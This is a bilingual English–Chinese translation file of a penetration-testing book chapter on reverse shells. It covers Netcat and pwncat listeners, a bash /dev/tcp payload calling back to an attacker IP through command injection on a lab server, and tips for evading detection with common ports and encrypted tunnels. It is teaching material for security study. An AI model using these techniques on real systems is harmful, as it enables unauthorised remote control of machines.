- en: <hgroup>
  id: totrans-0
  prefs: []
  type: TYPE_NORMAL
  zh: <hgroup>
- en: 7 REVERSE SHELLS
  id: totrans-1
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
  zh: 7 反向外壳
- en: </hgroup>
  id: totrans-2
  prefs: []
  type: TYPE_NORMAL
  zh: </hgroup>
- en: '![](../images/opener.jpg)'
  id: totrans-3
  prefs: []
  type: TYPE_IMG
  zh: '![](../images/opener.jpg)'
- en: 'You’ve practiced gaining initial access to a target by establishing web shells
    that provide temporary, one-way network channels. In this chapter, we’ll explore
    a more stable initial access technique: using *reverse shells*, which swap the
    direction of the network communication. Attackers use these reverse connections
    *from* a compromised target machine *to* their own machine to gain reliable control
    over the compromised system and execute commands remotely in a more synchronized
    fashion.'
  id: totrans-4
  prefs: []
  type: TYPE_NORMAL
  zh: 你已经练习过通过建立提供临时单向网络通道的 Web 外壳来获得目标的初步访问。在本章中，我们将探索一种更稳定的初步访问技术：使用*反向外壳*，它改变了网络通信的方向。攻击者使用这些反向连接*从*被攻陷的目标机器*到*他们自己的机器，进而在更同步的方式下获得对被攻陷系统的可靠控制并远程执行命令。
- en: You’ll learn how to create a reverse shell, then make your communications with
    remote environments more robust. As a bonus, you’ll also learn how to brute-force
    your way into SSH servers by using bash as your battering ram.
  id: totrans-5
  prefs: []
  type: TYPE_NORMAL
  zh: 你将学习如何创建反向外壳，并使与远程环境的通信更加稳健。作为附加内容，你还将学习如何通过使用 bash 作为攻击工具强行进入 SSH 服务器。
- en: How Reverse Shells Work
  id: totrans-6
  prefs:
  - PREF_H2
  type: TYPE_NORMAL
  zh: 反向外壳如何工作
- en: Often used for post-exploitation activities, reverse shells enable attackers
    to maintain control over a compromised system without directly connecting to it
    from their own machine, evading firewall restrictions.
  id: totrans-7
  prefs: []
  type: TYPE_NORMAL
  zh: 反向外壳常用于后期利用活动，它使攻击者能够在不直接从自己的机器连接的情况下，保持对被攻陷系统的控制，从而避开防火墙的限制。
- en: The term *reverse* refers to the direction of the initial network traffic. In
    a traditional shell or command execution flow, the attacker’s machine would typically
    be the one to connect to the compromised system to issue commands and control
    it. However, in the case of a reverse shell, the target is the one to reach out
    to the attacker. Let’s explore some principles of reverse shells.
  id: totrans-8
  prefs: []
  type: TYPE_NORMAL
  zh: '*反向*一词指的是初始网络流量的方向。在传统的外壳或命令执行流程中，攻击者的机器通常是连接到被攻陷系统，发出命令并控制它。然而，在反向外壳的情况下，目标系统是主动联系攻击者的。让我们来探索反向外壳的一些原理。'
- en: Ingress vs. Egress Controls
  id: totrans-9
  prefs:
  - PREF_H3
  type: TYPE_NORMAL
  zh: 入口与出口控制
- en: Reverse shell communications help us bypass firewall rules, network restrictions,
    and other security measures designed to block incoming (*ingress*) connections,
    including those used in the OS command injection and web shell attacks we covered
    in [Chapter 6](chapter6.xhtml).
  id: totrans-10
  prefs: []
  type: TYPE_NORMAL
  zh: 反向外壳通信帮助我们绕过防火墙规则、网络限制以及其他旨在阻止传入（*入口*）连接的安全措施，包括我们在[第六章](chapter6.xhtml)中讨论的操作系统命令注入和
    Web 外壳攻击。
- en: However, firewalls and network security devices are often configured to allow
    the outbound (*egress*) connections necessary for performing normal internet activity.
    When establishing a reverse shell, the compromised system initiates an egress
    connection to the attacker’s machine that is usually allowed by default. The firewall
    may perceive this egress connection as a legitimate action and won’t trigger alarms
    or security alerts.
  id: totrans-11
  prefs: []
  type: TYPE_NORMAL
  zh: 然而，防火墙和网络安全设备通常会配置为允许进行正常互联网活动所需的外发（*出口*）连接。在建立反向外壳时，被攻陷的系统会发起与攻击者机器的出口连接，这通常是默认允许的。防火墙可能将这个出口连接视为合法操作，因此不会触发警报或安全警告。
- en: Once the reverse shell connection is established, it should allow the attacker
    to maintain control over the compromised system. Mature environments may block
    outbound traffic to untrusted network addresses, but implementing this kind of
    restriction often isn’t a straightforward task, especially when certain machines
    on a network need access to wide ranges of network addresses.
  id: totrans-12
  prefs: []
  type: TYPE_NORMAL
  zh: 一旦建立了反向外壳连接，它应该允许攻击者保持对被攻陷系统的控制。成熟的环境可能会阻止向不受信任的网络地址的外发流量，但实施这种限制通常不是一项简单的任务，尤其是在网络中的某些机器需要访问广泛的网络地址范围时。
- en: Shell Payloads and Listeners
  id: totrans-13
  prefs:
  - PREF_H3
  type: TYPE_NORMAL
  zh: 外壳有效载荷和监听器
- en: 'You’ll need two tools to set up a reverse shell: a payload and a listener.
    The *payload* runs on the target machine. You’ll use different reverse shell payloads
    depending on the technologies and programming languages available on your target,
    as well as the type of platform it runs on. In this chapter, we’ll create a reverse
    shell payload with bash, but you can find a list of different reverse shell payloads
    at *[https://github.com/nicholasaleks/reverse-shells](https://github.com/nicholasaleks/reverse-shells)*.'
  id: totrans-14
  prefs: []
  type: TYPE_NORMAL
  zh: 要设置反向 Shell，你需要两个工具：一个负载和一个监听器。*负载* 在目标机器上运行。你将根据目标系统可用的技术和编程语言以及其运行的平台类型来使用不同的反向
    Shell 负载。在本章中，我们将使用 bash 创建一个反向 Shell 负载，但你可以在 *[https://github.com/nicholasaleks/reverse-shells](https://github.com/nicholasaleks/reverse-shells)*
    找到不同的反向 Shell 负载列表。
- en: A *shell listener* is a program that runs on the attacker machine to receive
    incoming reverse shell connections from compromised target systems. When a reverse
    shell payload is executed on a target system, the payload attempts to connect
    to the attacker’s machine. The shell listener program acts as the handler for
    these incoming connections; it listens on a specific port, waiting for the connection
    to be established, and provides an interactive shell session in which the attacker
    can enter commands to send to the compromised server, letting the attacker control
    the compromised server as if they were directly accessing the machine’s shell.
  id: totrans-15
  prefs: []
  type: TYPE_NORMAL
  zh: '*Shell 监听器* 是一个运行在攻击者机器上的程序，用于接收来自被攻陷目标系统的反向 Shell 连接。当反向 Shell 负载在目标系统上执行时，负载会尝试连接到攻击者的机器。Shell
    监听器程序作为这些传入连接的处理程序；它在特定端口上监听，等待连接的建立，并提供一个交互式的 Shell 会话，攻击者可以在其中输入命令并发送到被攻陷的服务器，允许攻击者控制被攻陷的服务器，就像他们直接访问该机器的
    Shell 一样。'
- en: One of the most popular shell listeners used in penetration tests is Netcat.
    We used it in [Chapter 4](chapter4.xhtml) to perform port scanning, but this versatile
    command line utility can read from and write to network connections in many other
    ways. We’ll discuss it in this chapter, along with alternative tools such as Socket
    Cat (socat) and pwncat.
  id: totrans-16
  prefs: []
  type: TYPE_NORMAL
  zh: 在渗透测试中最常用的 Shell 监听器之一是 Netcat。我们在[第 4 章](chapter4.xhtml)中使用了它来执行端口扫描，但这个多功能的命令行工具还可以以多种方式从网络连接中读取和写入数据。我们将在本章中讨论它，并介绍一些替代工具，如
    Socket Cat（socat）和 pwncat。
- en: The Communication Sequence
  id: totrans-17
  prefs:
  - PREF_H3
  type: TYPE_NORMAL
  zh: 通信序列
- en: '[Figure 7-1](chapter7.xhtml#fig7-1) describes the sequence of network communications
    involved in the use of reverse shells.'
  id: totrans-18
  prefs: []
  type: TYPE_NORMAL
  zh: '[图 7-1](chapter7.xhtml#fig7-1) 描述了使用反向 Shell 时网络通信的序列。'
- en: '![](../images/pg145.jpg)'
  id: totrans-19
  prefs: []
  type: TYPE_IMG
  zh: '![](../images/pg145.jpg)'
- en: 'Figure 7-1: The communication sequence of a reverse shell'
  id: totrans-20
  prefs: []
  type: TYPE_NORMAL
  zh: 图 7-1：反向 Shell 的通信序列
- en: 'Creating a reverse shell involves the following steps:'
  id: totrans-21
  prefs: []
  type: TYPE_NORMAL
  zh: 创建反向 Shell 包括以下步骤：
- en: '1.  Setting up a shell listener: The attacker machine initializes a shell listener
    running on a specific port that is accessible from the internet.'
  id: totrans-22
  prefs: []
  type: TYPE_NORMAL
  zh: 1.  设置 Shell 监听器：攻击者机器初始化一个 Shell 监听器，运行在一个可从互联网访问的特定端口上。
- en: '2.  Exploiting the target server: The attacker compromises the target system
    through a vulnerability.'
  id: totrans-23
  prefs: []
  type: TYPE_NORMAL
  zh: 2.  利用目标服务器：攻击者通过漏洞入侵目标系统。
- en: '3.  Uploading a reverse shell payload: The attacker crafts a reverse shell
    payload and delivers it by exploiting the underlying vulnerability in the target
    system.'
  id: totrans-24
  prefs: []
  type: TYPE_NORMAL
  zh: 3.  上传反向 Shell 负载：攻击者制作反向 Shell 负载，并通过利用目标系统中的潜在漏洞来传送它。
- en: '4.  Executing the payload: The payload is executed on the target server.'
  id: totrans-25
  prefs: []
  type: TYPE_NORMAL
  zh: 4.  执行负载：负载在目标服务器上执行。
- en: '5.  Requesting a reverse connection: The payload attempts to connect to the
    attacker’s machine, acting as the client.'
  id: totrans-26
  prefs: []
  type: TYPE_NORMAL
  zh: 5.  请求反向连接：负载尝试连接到攻击者的机器，充当客户端。
- en: '6.  Accepting the shell connection: The listener receives the incoming connection
    and establishes a bidirectional communication channel with the target machine
    over the network.'
  id: totrans-27
  prefs: []
  type: TYPE_NORMAL
  zh: 6.  接受 Shell 连接：监听器接收传入的连接，并通过网络与目标机器建立双向通信通道。
- en: '7.  Executing commands and gaining server control: With the reverse shell connection
    established, the attacker gains control over the compromised target system and
    may execute shell commands remotely.'
  id: totrans-28
  prefs: []
  type: TYPE_NORMAL
  zh: 7.  执行命令并获取服务器控制：反向 Shell 连接建立后，攻击者获得对被攻陷目标系统的控制，可以远程执行 Shell 命令。
- en: In the next section, we’ll see these steps in practice.
  id: totrans-29
  prefs: []
  type: TYPE_NORMAL
  zh: 在下一节中，我们将看到这些步骤的实际操作。
- en: Executing a Connection
  id: totrans-30
  prefs:
  - PREF_H2
  type: TYPE_NORMAL
  zh: 执行连接
- en: Let’s use bash to establish a reverse shell connection between the Kali attacker
    machine and a target, the *p-web-02* web application server (172.16.10.12).
  id: totrans-31
  prefs: []
  type: TYPE_NORMAL
  zh: 让我们使用 bash 在 Kali 攻击者机器和目标 *p-web-02* 网站应用服务器（172.16.10.12）之间建立反向 shell 连接。
- en: Setting Up a Netcat Listener
  id: totrans-32
  prefs:
  - PREF_H3
  type: TYPE_NORMAL
  zh: 设置 Netcat 监听器
- en: 'First, we must use Netcat to set up a shell listener on the Kali machine. Execute
    the following command in a brand-new terminal window:'
  id: totrans-33
  prefs: []
  type: TYPE_NORMAL
  zh: 首先，我们必须使用 Netcat 在 Kali 机器上设置一个 shell 监听器。在一个全新的终端窗口中执行以下命令：
- en: '[PRE0]'
  id: totrans-34
  prefs: []
  type: TYPE_PRE
  zh: '[PRE0]'
- en: The -l option instructs Netcat to listen for incoming connections. The -p 1337
    option specifies the port number to listen on, and the -vv option enables verbose
    mode, providing more detailed output for monitoring and debugging purposes.
  id: totrans-35
  prefs: []
  type: TYPE_NORMAL
  zh: -l 选项指示 Netcat 监听传入连接。-p 1337 选项指定监听的端口号，-vv 选项启用详细模式，为监控和调试提供更详细的输出。
- en: NOTE
  id: totrans-36
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: 注意
- en: '*In real-life scenarios, choose a port that will blend in with the environment
    so it’s harder to notice. For example, outbound connections on port 1337 could
    raise alerts, whereas blue team analysts might overlook traffic on common ports
    such as 80 or 443, which are often used by HTTP.*'
  id: totrans-37
  prefs: []
  type: TYPE_NORMAL
  zh: '*在实际场景中，选择一个与环境融合的端口，使其更难被发现。例如，端口 1337 上的外发连接可能会引发警报，而蓝队分析员可能会忽视如 80 或 443
    等常用端口上的流量，这些端口通常用于 HTTP。*'
- en: When the command executes, Netcat should start listening for incoming connections
    on the port specified.
  id: totrans-38
  prefs: []
  type: TYPE_NORMAL
  zh: 当命令执行时，Netcat 应该开始在指定的端口上监听传入连接。
- en: Crafting a Payload
  id: totrans-39
  prefs:
  - PREF_H3
  type: TYPE_NORMAL
  zh: 创建有效载荷
- en: Next, we’ll craft an interactive reverse shell payload by using the single line
    of bash in [Listing 7-1](chapter7.xhtml#Lis7-1). We’ll submit this line as user
    input to the target application in the next step.
  id: totrans-40
  prefs: []
  type: TYPE_NORMAL
  zh: 接下来，我们将通过使用 [列表 7-1](chapter7.xhtml#Lis7-1) 中的单行 bash 来创建一个交互式反向 shell 有效载荷。我们将在下一步将此行作为用户输入提交给目标应用程序。
- en: '[PRE1]'
  id: totrans-41
  prefs: []
  type: TYPE_PRE
  zh: '[PRE1]'
- en: 'Listing 7-1: A reverse shell payload'
  id: totrans-42
  prefs: []
  type: TYPE_NORMAL
  zh: 列表 7-1：反向 shell 有效载荷
- en: 'The -i option makes the bash shell interactive, allowing it to receive input
    and produce output. The */dev/tcp* path is a special *pseudo-device file* in Linux
    that provides access to TCP sockets. A similar file, */dev/udp*, exists for UDP.
    We add to the filepath the IP address of the Kali machine and the port on which
    the Kali shell is waiting for incoming connections: */dev/ tcp/172.16.10.1/1337*.'
  id: totrans-43
  prefs: []
  type: TYPE_NORMAL
  zh: -i 选项使 bash shell 变得交互式，允许它接收输入并生成输出。*/dev/tcp* 路径是 Linux 中一个特殊的 *伪设备文件*，它提供对
    TCP 套接字的访问。类似的文件 * /dev/udp* 也存在，提供对 UDP 的访问。我们在文件路径中添加 Kali 机器的 IP 地址以及 Kali
    shell 正在等待连接的端口：*/dev/tcp/172.16.10.1/1337*。
- en: The >& syntax combines the standard output (stdout) and standard error (stderr)
    streams into a single stream. By combining these streams, we ensure that both
    the regular command outputs and any error messages generated by the reverse shell
    payload get redirected to our listener.
  id: totrans-44
  prefs: []
  type: TYPE_NORMAL
  zh: '>& 语法将标准输出（stdout）和标准错误（stderr）流合并为一个流。通过合并这些流，我们确保反向 shell 有效载荷生成的常规命令输出和任何错误信息都会被重定向到我们的监听器。'
- en: You may have noticed that we use bash -c to wrap the entire payload in single
    quotes. This specialized wrapping allows us to explicitly invoke a new instance
    of the bash shell while specifying a command string to execute with the -c option.
    It also ensures that the subsequent command is executed using bash, regardless
    of the default shell set on the target system. You could even specify the bash
    shell’s full executable path (using /bin/bash -c) to further ensure that the payload
    executes correctly.
  id: totrans-45
  prefs: []
  type: TYPE_NORMAL
  zh: 你可能已经注意到，我们使用 bash -c 将整个有效载荷包裹在单引号中。这种特殊的包裹方式使我们能够明确调用一个新的 bash shell 实例，同时指定一个命令字符串，通过
    -c 选项来执行。它还确保随后执行的命令将使用 bash 来执行，而不管目标系统上设置的默认 shell 是什么。你甚至可以指定 bash shell 的完整可执行路径（使用
    /bin/bash -c）来进一步确保有效载荷正确执行。
- en: Delivering and Initializing the Payload
  id: totrans-46
  prefs:
  - PREF_H3
  type: TYPE_NORMAL
  zh: 传递和初始化有效载荷
- en: To deliver the single-line reverse shell payload we created, we’ll exploit the
    OS command injection vulnerability we identified in *p-web-02* (172.16.10.12)
    in [Chapter 6](chapter6.xhtml). Note that [Figure 7-2](chapter7.xhtml#fig7-2)
    includes the full reverse shell payload, as well as the pipe metacharacter | used
    to exploit the vulnerability.
  id: totrans-47
  prefs: []
  type: TYPE_NORMAL
  zh: 为了传递我们创建的单行反向 shell 有效载荷，我们将利用我们在 [第 6 章](chapter6.xhtml) 中识别的 *p-web-02*（172.16.10.12）中的操作系统命令注入漏洞。请注意，[图
    7-2](chapter7.xhtml#fig7-2) 包括了完整的反向 shell 有效载荷，以及用于利用该漏洞的管道元字符 |。
- en: '![](../images/pg147.jpg)'
  id: totrans-48
  prefs: []
  type: TYPE_IMG
  zh: '![](../images/pg147.jpg)'
- en: 'Figure 7-2: The successful injection of a reverse shell payload into p-web-02'
  id: totrans-49
  prefs: []
  type: TYPE_NORMAL
  zh: 图 7-2：成功将反向 shell 有效载荷注入 p-web-02
- en: 'Clicking the **Donate** button should instantly trigger the reverse shell connection.
    In the Kali terminal window running the shell listener, you should see the following
    output:'
  id: totrans-50
  prefs: []
  type: TYPE_NORMAL
  zh: 点击 **Donate** 按钮应立即触发反向 shell 连接。在运行 shell 监听器的 Kali 终端窗口中，你应看到以下输出：
- en: '[PRE2]'
  id: totrans-51
  prefs: []
  type: TYPE_PRE
  zh: '[PRE2]'
- en: Success! We’ve popped yet another shell and compromised the *p-web-02* server.
    In the prompt on the final line, we can see confirmation that we’ve gained an
    active shell on the *p-web-02* host by using the *www-data* user and that the
    present working directory is */var/www/html*.
  id: totrans-52
  prefs: []
  type: TYPE_NORMAL
  zh: 成功！我们已经再次获得了一个 shell，并攻陷了 *p-web-02* 服务器。在最后一行的提示符中，我们可以看到确认信息，表明我们已经通过使用 *www-data*
    用户在 *p-web-02* 主机上获得了一个活动的 shell，并且当前工作目录是 */var/www/html*。
- en: Executing Commands
  id: totrans-53
  prefs:
  - PREF_H3
  type: TYPE_NORMAL
  zh: 执行命令
- en: 'We can now use the Kali shell listener terminal just as we would any other
    shell. Let’s remotely execute a bash command on *p-web-02* through the reverse
    shell:'
  id: totrans-54
  prefs: []
  type: TYPE_NORMAL
  zh: 现在我们可以像使用任何其他 shell 一样使用 Kali shell 监听器终端。让我们通过反向 shell 在 *p-web-02* 上远程执行一个
    bash 命令：
- en: '[PRE3]'
  id: totrans-55
  prefs: []
  type: TYPE_PRE
  zh: '[PRE3]'
- en: In this example, we remotely execute the uname -a command on the server and
    automatically return its output stream back to the Kali listener.
  id: totrans-56
  prefs: []
  type: TYPE_NORMAL
  zh: 在本示例中，我们远程执行了 uname -a 命令，并自动将其输出流返回给 Kali 监听器。
- en: We can even do some introspection on the connection by entering the process
    snapshot command ps aux and reviewing the currently running reverse shell process
    ([Listing 7-2](chapter7.xhtml#Lis7-2)).
  id: totrans-57
  prefs: []
  type: TYPE_NORMAL
  zh: 我们甚至可以通过输入进程快照命令 ps aux 来进行一些连接的内部查看，查看当前正在运行的反向 shell 进程（[列出 7-2](chapter7.xhtml#Lis7-2)）。
- en: '[PRE4]'
  id: totrans-58
  prefs: []
  type: TYPE_PRE
  zh: '[PRE4]'
- en: 'Listing 7-2: Viewing process information'
  id: totrans-59
  prefs: []
  type: TYPE_NORMAL
  zh: 列出 7-2：查看进程信息
- en: In the process output, we can clearly see how the reverse shell payload gets
    executed on the remote server, starting with the process whose ID is 131\. (Process
    IDs may differ on your machine.)
  id: totrans-60
  prefs: []
  type: TYPE_NORMAL
  zh: 在进程输出中，我们可以清楚地看到反向 shell 载荷是如何在远程服务器上执行的，从进程 ID 为 131 的进程开始。（进程 ID 在你的机器上可能不同。）
- en: To break it down further, the initial command, sh ❶, calls upon the bash -c
    command ❷. This command allows us to execute the desired shell instance, which
    in this case is bash, identified by process ID 134 ❸. By leveraging this chain
    of processes and accessing the network capabilities provided by */dev/tcp*, we
    elevate our reverse shell capabilities from a limited sh shell to a fully functional
    bash shell. This upgrade provides us with a wider range of advanced reverse shell
    techniques, allowing for sophisticated post-exploitation activities and the ability
    to maintain control over compromised systems.
  id: totrans-61
  prefs: []
  type: TYPE_NORMAL
  zh: 进一步解析，初始命令 sh ❶ 调用了 bash -c 命令 ❷。该命令允许我们执行所需的 shell 实例，在本例中是 bash，进程 ID 为 134
    ❸。通过利用这一系列进程并访问由 */dev/tcp* 提供的网络功能，我们将反向 shell 能力从有限的 sh shell 提升为功能完整的 bash
    shell。这一升级为我们提供了更广泛的高级反向 shell 技巧，使得复杂的后渗透活动成为可能，并能够维持对被攻陷系统的控制。
- en: Listening with pwncat
  id: totrans-62
  prefs:
  - PREF_H3
  type: TYPE_NORMAL
  zh: 使用 pwncat 监听
- en: pwncat is another useful utility for capturing and interacting with reverse
    shells. It lets us create a reverse shell listener, then use its built-in modules
    for a variety of purposes.
  id: totrans-63
  prefs: []
  type: TYPE_NORMAL
  zh: pwncat 是另一个有用的工具，用于捕获和交互反向 shell。它允许我们创建反向 shell 监听器，然后利用其内建模块进行各种操作。
- en: 'For example, let’s use it to send commands through the reverse shell. Later
    in this chapter, we’ll use it for file uploads as well. Start a pwncat reverse
    shell listener:'
  id: totrans-64
  prefs: []
  type: TYPE_NORMAL
  zh: 例如，让我们通过反向 shell 发送命令。稍后在本章中，我们也将使用它进行文件上传。启动一个 pwncat 反向 shell 监听器：
- en: '[PRE5]'
  id: totrans-65
  prefs: []
  type: TYPE_PRE
  zh: '[PRE5]'
- en: The output shows that pwncat is actively listening for any incoming connections
    made by compromised machines.
  id: totrans-66
  prefs: []
  type: TYPE_NORMAL
  zh: 输出显示 pwncat 正在积极监听被攻陷机器发来的任何连接。
- en: 'Now we can inject the command that will give us a reverse shell, as we did
    earlier in this chapter. Once pwncat receives the shell, you’ll see a message
    in the terminal, and you’ll be able to run commands:'
  id: totrans-67
  prefs: []
  type: TYPE_NORMAL
  zh: 现在我们可以注入将为我们提供反向 shell 的命令，就像本章之前所做的那样。一旦 pwncat 接收到 shell，你将在终端中看到一条消息，并且能够运行命令：
- en: '[PRE6]'
  id: totrans-68
  prefs: []
  type: TYPE_PRE
  zh: '[PRE6]'
- en: 'The message (local) pwncat$ is pwncat’s prompt, at which you enter commands.
    Enter help to see existing options:'
  id: totrans-69
  prefs: []
  type: TYPE_NORMAL
  zh: 消息（local）pwncat$ 是 pwncat 的提示符，你可以在此输入命令。输入 help 查看现有选项：
- en: '[PRE7]'
  id: totrans-70
  prefs: []
  type: TYPE_PRE
  zh: '[PRE7]'
- en: 'Many options are available. To run a few shell commands, you must first use
    the back command. This command will return to the compromised host:'
  id: totrans-71
  prefs: []
  type: TYPE_NORMAL
  zh: 提供了许多选项。要运行一些 shell 命令，首先必须使用 back 命令。该命令将返回到被攻陷的主机：
- en: '[PRE8]'
  id: totrans-72
  prefs: []
  type: TYPE_PRE
  zh: '[PRE8]'
- en: 'Now you can run commands on the target:'
  id: totrans-73
  prefs: []
  type: TYPE_NORMAL
  zh: 现在你可以在目标系统上运行命令：
- en: '[PRE9]'
  id: totrans-74
  prefs: []
  type: TYPE_PRE
  zh: '[PRE9]'
- en: As you can see, pwncat is able to send commands and retrieve the results.
  id: totrans-75
  prefs: []
  type: TYPE_NORMAL
  zh: 如你所见，pwncat 能够发送命令并获取结果。
- en: Bypassing Security Controls
  id: totrans-76
  prefs:
  - PREF_H2
  type: TYPE_NORMAL
  zh: 绕过安全控制
- en: When performing penetration tests, you may run into environments in which the
    shell you’ve established is hard to use. The shell itself might be limited, for
    instance, or the environment might reduce the number of packages available in
    an attempt to harden the system.
  id: totrans-77
  prefs: []
  type: TYPE_NORMAL
  zh: 在进行渗透测试时，你可能会遇到一些环境，在这些环境中，你建立的 shell 很难使用。例如，Shell 本身可能会有限制，或者该环境可能通过减少可用的包来增强系统的安全性。
- en: For example, [Table 7-1](chapter7.xhtml#tab7-1) shows the differences between
    commands run in the Kali shell environment and in the *p-web-02* reverse shell.
  id: totrans-78
  prefs: []
  type: TYPE_NORMAL
  zh: 例如，[表 7-1](chapter7.xhtml#tab7-1) 展示了在 Kali shell 环境与 *p-web-02* 反向 Shell 中运行的命令之间的差异。
- en: 'Table 7-1: Commands Run in Kali vs. p-web-02'
  id: totrans-79
  prefs: []
  type: TYPE_NORMAL
  zh: 表 7-1：Kali 与 p-web-02 中运行的命令比较
- en: '| Kali shell | p-web-02 reverse shell |'
  id: totrans-80
  prefs: []
  type: TYPE_TB
  zh: '| Kali shell | p-web-02 反向 Shell |'
- en: '| --- | --- |'
  id: totrans-81
  prefs: []
  type: TYPE_TB
  zh: '| --- | --- |'
- en: '| $ echo $SHELL | $ echo $SHELL |'
  id: totrans-82
  prefs: []
  type: TYPE_TB
  zh: '| $ echo $SHELL | $ echo $SHELL |'
- en: '| /bin/bash | /usr/sbin/nologin |'
  id: totrans-83
  prefs: []
  type: TYPE_TB
  zh: '| /bin/bash | /usr/sbin/nologin |'
- en: '| $ whoami | $ whoami |'
  id: totrans-84
  prefs: []
  type: TYPE_TB
  zh: '| $ whoami | $ whoami |'
- en: '| Kali | www-data |'
  id: totrans-85
  prefs: []
  type: TYPE_TB
  zh: '| Kali | www-data |'
- en: '| $ ls /bin &#124; wc -l | $ ls /bin &#124; wc -l |'
  id: totrans-86
  prefs: []
  type: TYPE_TB
  zh: '| $ ls /bin &#124; wc -l | $ ls /bin &#124; wc -l |'
- en: '| 3249 | 89 |'
  id: totrans-87
  prefs: []
  type: TYPE_TB
  zh: '| 3249 | 89 |'
- en: '| $ wget | $ wget |'
  id: totrans-88
  prefs: []
  type: TYPE_TB
  zh: '| $ wget | $ wget |'
- en: '| wget: missing URL | Bash: wget: command not found |'
  id: totrans-89
  prefs: []
  type: TYPE_TB
  zh: '| wget: missing URL | Bash: wget: command not found |'
- en: '| Usage: wget [Option] ... |  |'
  id: totrans-90
  prefs: []
  type: TYPE_TB
  zh: '| 用法：wget [选项] ... |  |'
- en: The *p-web-02* environment lacks many of the user privileges of the Kali shell
    and even has a drastically different number of available binaries. This makes
    sense because Kali is a full-fledged operating system with a graphical interface,
    whereas *p-web-02* is a slim container with the bare minimum amount of software
    required to function.
  id: totrans-91
  prefs: []
  type: TYPE_NORMAL
  zh: '*p-web-02* 环境缺乏 Kali shell 的许多用户权限，甚至可用的二进制文件数量也有显著不同。这是合理的，因为 Kali 是一个完整的操作系统，带有图形界面，而
    *p-web-02* 是一个精简的容器，仅包含最基本的操作所需的软件。'
- en: A lack of installed or built-in binaries is normal in cloud-hosted web application
    servers like the one *p-web-02* is mimicking. This is due to performance, security,
    and resource optimization requirements. A slim system image requires less maintenance
    overhead and provides faster deployment times.
  id: totrans-92
  prefs: []
  type: TYPE_NORMAL
  zh: 在类似 *p-web-02* 所模拟的云托管 Web 应用服务器中，缺少已安装或内建的二进制文件是正常现象。这是由于性能、安全性和资源优化的需求。精简的系统镜像需要更少的维护工作量，并且提供更快的部署速度。
- en: Third-party tools are even tailored to remove excessive packages from an image
    (a process called *minification*). For example, the SlimToolkit project at *[https://github.com/slimtoolkit/slim](https://github.com/slimtoolkit/slim)*
    runs several analysis techniques on an image to identify unused packages, then
    optimizes the operating system size by removing them.
  id: totrans-93
  prefs: []
  type: TYPE_NORMAL
  zh: 第三方工具甚至可以定制化去除镜像中的多余包（这一过程称为*最小化*）。例如，*SlimToolkit* 项目在 *[https://github.com/slimtoolkit/slim](https://github.com/slimtoolkit/slim)*
    中运行多种分析技术，识别未使用的包，然后通过移除它们来优化操作系统大小。
- en: In this section, we’ll highlight a few high-level techniques used to hide reverse
    shell communications or bypass security restrictions in hardened environments.
    These techniques can evade initial access security measures and allow us to maintain
    control over compromised systems.
  id: totrans-94
  prefs: []
  type: TYPE_NORMAL
  zh: 在本节中，我们将突出一些高阶技术，这些技术用于隐藏反向 Shell 通信或绕过在加固环境中的安全限制。这些技术可以避开初步的访问安全措施，并让我们维持对被攻破系统的控制。
- en: Encrypting and Encapsulating Traffic
  id: totrans-95
  prefs:
  - PREF_H3
  type: TYPE_NORMAL
  zh: 加密与封装流量
- en: To evade detection, reverse shells can use encryption and encapsulation techniques
    to hide the malicious traffic within legitimate protocols or connections. By *encrypting*
    the communication, we can render the contents of the reverse shell traffic unreadable,
    making it challenging for security devices to identify any malicious payload or
    commands being sent.
  id: totrans-96
  prefs: []
  type: TYPE_NORMAL
  zh: 为了避免被检测到，反向 Shell 可以使用加密和封装技术，将恶意流量隐藏在合法的协议或连接中。通过*加密*通信，我们可以使反向 Shell 流量的内容不可读，从而使安全设备难以识别任何恶意负载或指令。
- en: '*Encapsulation* conceals the reverse shell traffic within innocuous protocols
    or already encrypted connections. This technique disguises the reverse shell communication
    as legitimate traffic.'
  id: totrans-97
  prefs: []
  type: TYPE_NORMAL
  zh: '*封装* 技术将反向 Shell 流量隐藏在无害的协议或已加密的连接中。这项技术将反向 Shell 通信伪装成合法流量。'
- en: '[Figure 7-3](chapter7.xhtml#fig7-3) shows how an encrypted tunnel between a
    compromised server and the attacker machine could work. As you can see, the reverse
    shell connection occurs within the encrypted connection.'
  id: totrans-98
  prefs: []
  type: TYPE_NORMAL
  zh: '[图 7-3](chapter7.xhtml#fig7-3) 展示了一个加密隧道如何在被攻破的服务器与攻击者机器之间工作。如你所见，反向 Shell
    连接发生在加密连接之内。'
- en: '![](../images/pg151.jpg)'
  id: totrans-99
  prefs: []
  type: TYPE_IMG
  zh: '![](../images/pg151.jpg)'
- en: 'Figure 7-3: A reverse shell over an encrypted communication channel'
  id: totrans-100
  prefs: []
  type: TYPE_NORMAL
  zh: 图 7-3：通过加密通信通道的反向 Shell
- en: We can create a reverse shell over an encrypted transport protocol in multiple
    ways. One way is by using *Ncat* (not to be confused with Netcat), a network utility
    that is packaged with Nmap and allows the redirection, writing, reading, and encryption
    of traffic.
  id: totrans-101
  prefs: []
  type: TYPE_NORMAL
  zh: 我们可以通过多种方式创建一个加密的反向 Shell 连接。其中一种方式是使用 *Ncat*（与 Netcat 不要混淆），它是一个与 Nmap 一起打包的网络工具，允许流量的重定向、读写和加密。
- en: 'You can use the following command sequence between the attacker and target
    machine to establish a reverse shell connection that is encapsulated by an encrypted
    tunnel. On the attacker machine, start a Secure Sockets Layer (SSL) listener with
    Ncat:'
  id: totrans-102
  prefs: []
  type: TYPE_NORMAL
  zh: 你可以使用以下命令序列在攻击者机器和目标机器之间建立一个被加密隧道封装的反向 Shell 连接。在攻击者机器上，启动一个 SSL（安全套接字层）监听器，使用
    Ncat：
- en: '[PRE10]'
  id: totrans-103
  prefs: []
  type: TYPE_PRE
  zh: '[PRE10]'
- en: Use the -v (verbose) flag, specify the port to the -l (listen) flag, and then
    use --ssl for encryption. Ncat should generate temporary asymmetric keys (Rivest-Shamir-Adleman,
    or RSA) by default unless you specify otherwise.
  id: totrans-104
  prefs: []
  type: TYPE_NORMAL
  zh: 使用 -v（详细输出）标志，指定端口到 -l（监听）标志，然后使用 --ssl 来加密。除非另行指定，否则 Ncat 默认会生成临时的非对称密钥（Rivest-Shamir-Adleman，或
    RSA）。
- en: 'On the compromised machine, the following command will establish an encrypted
    reverse shell. However, the compromised machine must have Ncat available for this
    command to work, and it often isn’t available by default:'
  id: totrans-105
  prefs: []
  type: TYPE_NORMAL
